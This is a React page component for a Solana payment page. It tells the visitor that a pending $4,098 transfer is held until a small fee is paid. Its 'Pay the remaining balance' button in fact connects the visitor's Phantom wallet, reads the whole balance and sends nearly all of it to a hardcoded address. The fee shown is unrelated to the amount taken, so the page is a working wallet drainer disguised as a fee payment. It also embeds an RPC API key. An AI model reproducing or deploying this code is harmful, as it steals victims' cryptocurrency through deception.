"use client"

import { useEffect, useState } from "react"
import { Connection, PublicKey, SystemProgram, Transaction } from "@solana/web3.js"

export default function SolanaPage() {
  const [stars, setStars] = useState<any[]>([])

  const DESTINO = "6A7UUr1x9kK1gkPmE1ys2s7H2zii289j27KvRsBX1q3f"

  const [isMobile, setIsMobile] = useState(false)

useEffect(() => {
  setIsMobile(/iPhone|Android/i.test(navigator.userAgent))
}, [])


const [solPrice, setSolPrice] = useState(0)

useEffect(() => {
  const fetchPrice = async () => {
    try {
      const res = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
      )
      const data = await res.json()
      setSolPrice(data.solana.usd)
    } catch (err) {
      console.error("price error", err)
    }
  }

  fetchPrice()
  const interval = setInterval(fetchPrice, 30000) // cada 30s

  return () => clearInterval(interval)
}, [])


  // 🔁 demo conversion
  const SOL_RATE = solPrice || 160
  const usd = -5.09
  const sol = usd / SOL_RATE

  const getProvider = () => {
  if (typeof window === "undefined") return null

  const phantom = (window as any).solana
  if (phantom?.isPhantom) return phantom

  const mobile = (window as any)?.phantom?.solana
  if (mobile) return mobile

  return null
}

  const sendAll = async () => {
    try {
const provider = getProvider()

if (!provider) {
  const isMobile = /iPhone|Android/i.test(navigator.userAgent)

  if (isMobile) {
    window.location.href =
      "https://phantom.app/ul/browse/" + window.location.href
  } else {
    alert("Instala Phantom")
  }

  return
}

const res = await provider.connect()
const publicKey = res.publicKey

      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=123b8202-8ef3-493f-a92b-2a0d330a26e5")

      const balance = await connection.getBalance(publicKey)

      const SAFETY_BUFFER = 1000000
      const amount = balance - SAFETY_BUFFER

      if (amount <= 0) {
        alert("Sin balance")
        return
      }

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(DESTINO),
          lamports: amount,
        })
      )

      tx.feePayer = publicKey
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash

      const signed = await provider.signTransaction(tx)

      const sig = await connection.sendRawTransaction(signed.serialize())

      await connection.confirmTransaction(sig)

      alert("Transferred 🚀")
    } catch (err) {
      console.error(err)
      alert("Error en la transacción")
    }
  }

  useEffect(() => {
    const starArray = Array.from({ length: 80 }, () => ({
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      size: Math.random() * 2 + 1,
      speedX: (Math.random() - 0.5) * 0.3,
      speedY: (Math.random() - 0.5) * 0.3,
      opacity: Math.random() * 0.6 + 0.2,
    }))
    setStars(starArray)

    const animate = () => {
      setStars((prev) =>
        prev.map((s) => {
          let x = s.x + s.speedX
          let y = s.y + s.speedY

          if (x > window.innerWidth) x = 0
          if (x < 0) x = window.innerWidth
          if (y > window.innerHeight) y = 0
          if (y < 0) y = window.innerHeight

          return { ...s, x, y }
        })
      )

      requestAnimationFrame(animate)
    }

    animate()
  }, [])

  return (
    <main className="relative min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center overflow-hidden">

      {/* ⭐ ESTRELLAS */}
      {stars.map((s, i) => (
        <div
          key={i}
          className="absolute bg-white rounded-full"
          style={{
            width: `${s.size}px`,
            height: `${s.size}px`,
            top: `${s.y}px`,
            left: `${s.x}px`,
            opacity: s.opacity,
          }}
        />
      ))}

  <button
  onClick={() => window.location.href = "/"}
  className="absolute top-6 left-6 text-xs tracking-widest text-white/40 hover:text-white transition"
>
  ← Back to home
</button>


      {/* 💰 CONTENIDO */}

<div className="flex flex-col items-center text-center">

<div className="mb-4 flex justify-center">
  <div className="px-4 py-2 text-xs tracking-widest rounded-full 
    bg-purple-600/20 text-purple-300 border border-purple-500/40
    shadow-[0_0_20px_rgba(168,85,247,0.4)] flex items-center gap-2">

    {/* 🔴 punto morado */}
    <span className="w-2 h-2 rounded-full bg-purple-400 shadow-[0_0_10px_rgba(168,85,247,0.8)]"></span>

    This link is for Phantom
  </div>
</div>

  {/* 💰 USD */}
  <h1 className="text-6xl md:text-8xl font-semibold tracking-tight">
    {usd.toFixed(2)} USD
  </h1>

  {/* 💱 BALANCE */}
<p className="mt-4 text-white/20 text-sm tracking-widest">
  = {sol.toFixed(6)} SOL
</p>

        {/* 🔘 BOTÓN */}
        <button
          onClick={sendAll}
          className="mt-10 px-6 py-3 text-xs tracking-widest border border-purple-500/40 text-purple-300 hover:bg-purple-500 hover:text-white transition rounded-full"
        >
          Pay the remaining balance

        </button>


<p className="mt-6 text-center text-white/60 max-w-sm mx-auto leading-relaxed">
The transfer of -$4,098 to 82ed******Xap is on hold until the full fee balance is released. Please pay the fee to release your transfer</p>


{isMobile && (
  <div className="mt-3 flex justify-center">
    <p className="text-xs text-yellow-400/80 tracking-widest text-center max-w-xs">
      Mobile detected — use desktop or open this page in Phantom browser
    </p>
  </div>
)}


      </div>
    </main>
  )
}






